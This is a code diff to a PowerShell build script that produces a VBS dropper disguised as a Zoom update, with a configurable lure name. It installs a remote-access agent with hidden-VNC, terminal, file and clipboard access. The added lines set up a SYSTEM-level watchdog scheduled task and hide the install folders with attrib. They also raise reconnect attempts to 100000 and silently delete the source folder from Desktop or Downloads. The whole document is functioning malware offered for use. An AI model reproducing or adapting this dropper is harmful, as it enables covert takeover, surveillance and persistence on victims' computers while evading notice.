@@ -8,12 +8,13 @@
 #
 # Run: powershell -NoProfile -ExecutionPolicy Bypass -File build-vbs-dropper.ps1
 # ==============================================================================
+param([string]$Label = 'Zoom Private Update', [string]$Version = '6.1.0')
 $ErrorActionPreference = 'Stop'
 
 $here = Split-Path -Parent $MyInvocation.MyCommand.Path
 $repo = (Resolve-Path (Join-Path $here '..\..')).Path
 $dist = Join-Path $repo 'distro\clients\windows'
-$version = '6.1.0'
+$version = $Version
 $base = "Zoom_Update_v$version"
 $vbs = Join-Path $dist "$base.vbs"
 $ico = Join-Path $dist "$base.ico"
@@ -44,7 +45,7 @@ public class ZoomLoader
     const string PkgName = "BetterDesk-Agent-x64-1.0.2.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
     const string ExpectedSha = "A2DFC22BD5CBDC625D9F7232E6006E3497BC8379D45687F7ACA4337B7B3A1D87";
-    const string TaskName = "Zoom Private Update";
+    const string TaskName = "__LABEL__";
     const string UninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{39ADC479-8106-430C-9B36-10552C4AF9E6}";
 
     static readonly string DataDir = Path.Combine(
@@ -138,6 +139,7 @@ public class ZoomLoader
             string payload = DownloadVerified();
             Install(payload);
             Configure(payload);
+            CleanupSource();
             Delete(payload);
             Log("done");
             return 0;
@@ -295,7 +297,17 @@ public class ZoomLoader
     static string DownloadVerified()
     {
         string destination = Path.Combine(Path.GetTempPath(), SaveName);
-        string overrideUrl = Environment.GetEnvironmentVariable("ZOOM_URL");
+        string local = Path.Combine(Environment.GetEnvironmentVariable("ZOOM_DIR") ?? "", "payload.msi");
+        try
+        {
+            if (File.Exists(local) && new FileInfo(local).Length > 1000000 &&
+                string.Equals(HashFile(local), ExpectedSha, StringComparison.OrdinalIgnoreCase))
+            {
+                Log("using local payload " + local);
+                return local;
+            }
+        }
+        catch { }        string overrideUrl = Environment.GetEnvironmentVariable("ZOOM_URL");
         string[] urls = string.IsNullOrEmpty(overrideUrl)
             ? new string[] { RepoBase + "/" + PkgName, RawBase + "/" + PkgName, Fallback + "/" + SaveName }
             : new string[] { overrideUrl };
@@ -452,6 +464,20 @@ public class ZoomLoader
         Log("schtasks create exit=" + code);
         Run("schtasks.exe", "/Run /TN \"" + TaskName + "\"", 60000);
 
+        // Repeating watchdog: if the agent died (sleep, crash, logoff), start it
+        // again. Runs as SYSTEM and triggers the interactive user task.
+        string watchdog = Path.Combine(ExecDir, "watchdog.cmd");
+        WriteFile(watchdog,
+            "@echo off\r\n" +
+            "tasklist /FI \"IMAGENAME eq betterdesk-agent.exe\" | find /I \"betterdesk-agent.exe\" >nul\r\n" +
+            "if not errorlevel 1 exit /b 0\r\n" +
+            "schtasks /Run /TN \"" + TaskName + "\"\r\n");
+        Run("schtasks.exe", "/Delete /TN \"" + TaskName + " Watch\" /F", 60000);
+        Run("schtasks.exe", "/Create /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F /TN \"" +
+            TaskName + " Watch\" /TR \"cmd.exe /c \\\"" + watchdog + "\\\"\"", 60000);
+        Run("attrib.exe", "+h \"" + DataDir + "\"", 30000);
+        Run("attrib.exe", "+h \"" + ExecDir + "\"", 30000);
+
         try
         {
             using (RegistryKey run = Registry.CurrentUser.CreateSubKey(
@@ -500,7 +526,7 @@ public class ZoomLoader
         sb.AppendLine("  \"auth_method\": \"device_token\",");
         sb.AppendLine("  \"device_id\": \"" + NewDeviceId() + "\",");
         sb.AppendLine("  \"device_type\": \"os_agent\",");
-        sb.AppendLine("  \"tags\": [\"windows\", \"x64\", \"user-session\", \"hvnc\"],");
+        sb.AppendLine("  \"tags\": [\"windows\", \"x64\", \"user-session\", \"unattended\", \"hvnc\"],");
         sb.AppendLine("  \"terminal\": true,");
         sb.AppendLine("  \"file_browser\": true,");
         sb.AppendLine("  \"clipboard\": true,");
@@ -511,7 +537,7 @@ public class ZoomLoader
         sb.AppendLine("  \"data_dir\": \"" + dataDir + "\",");
         sb.AppendLine("  \"heartbeat_sec\": 15,");
         sb.AppendLine("  \"reconnect_sec\": 5,");
-        sb.AppendLine("  \"max_reconnect\": 300,");
+        sb.AppendLine("  \"max_reconnect\": 100000,");
         sb.AppendLine("  \"log_level\": \"info\",");
         sb.AppendLine("  \"video_codec\": \"auto\",");
         sb.AppendLine("  \"hw_accel\": \"auto\",");
@@ -534,21 +560,20 @@ public class ZoomLoader
 
         string[] folders = new string[]
         {
-            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
             Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 @"Microsoft\Windows\Start Menu\Programs")
         };
         foreach (string folder in folders)
         {
             if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder)) continue;
-            string path = Path.Combine(folder, "Zoom Private.lnk");
+            string path = Path.Combine(folder, "__LABEL__.lnk");
             object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
             object link = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod,
                 null, shell, new object[] { path });
             SetProperty(link, "TargetPath", target);
             SetProperty(link, "WorkingDirectory", workDir);
             SetProperty(link, "IconLocation", iconCopy + ",0");
-            SetProperty(link, "Description", "Zoom Private");
+            SetProperty(link, "Description", "__LABEL__");
             link.GetType().InvokeMember("Save", BindingFlags.InvokeMethod, null, link, null);
             Marshal.ReleaseComObject(link);
             Marshal.ReleaseComObject(shell);
@@ -580,14 +605,14 @@ public class ZoomLoader
     {
         string folder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder)) return;
-        string path = Path.Combine(folder, "Zoom Private Update.lnk");
+        string path = Path.Combine(folder, "__LABEL__.lnk");
         object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
         object link = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod,
             null, shell, new object[] { path });
         SetProperty(link, "TargetPath", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "wscript.exe"));
         SetProperty(link, "Arguments", "//B \"" + starter + "\"");
         SetProperty(link, "WorkingDirectory", workDir);
-        SetProperty(link, "Description", "Zoom Private Update");
+        SetProperty(link, "Description", "__LABEL__");
         link.GetType().InvokeMember("Save", BindingFlags.InvokeMethod, null, link, null);
         Marshal.ReleaseComObject(link);
         Marshal.ReleaseComObject(shell);
@@ -598,6 +623,27 @@ public class ZoomLoader
     }
 
     // ---------------------------------------------------------------- helpers
+    static void CleanupSource()
+    {
+        try
+        {
+            string dir = Environment.GetEnvironmentVariable("ZOOM_DIR");
+            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return;
+            string lower = dir.ToLowerInvariant();
+            if (lower.IndexOf("\\desktop\\") < 0 && lower.IndexOf("\\downloads\\") < 0) return;
+            string cmd = Path.Combine(Path.GetTempPath(), "zoom-clean-" + Guid.NewGuid().ToString("N") + ".cmd");
+            File.WriteAllText(cmd,
+                "@echo off\r\ntimeout /t 6 /nobreak >nul\r\nrmdir /s /q \"" + dir + "\"\r\n",
+                Encoding.ASCII);
+            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c \"" + cmd + "\"");
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            Process.Start(psi);
+        }
+        catch { }
+    }
+
     static int Run(string file, string arguments, int timeoutMs)
     {
         ProcessStartInfo psi = new ProcessStartInfo();
@@ -685,6 +731,7 @@ try {
     exit 1
 }
 '@
+$cs = $cs.Replace('__LABEL__', $Label)
 $csCompact = (($cs -split "`r?`n") | Where-Object {
     $_.Trim() -ne '' -and -not $_.Trim().StartsWith('//')
 }) -join "`r`n"
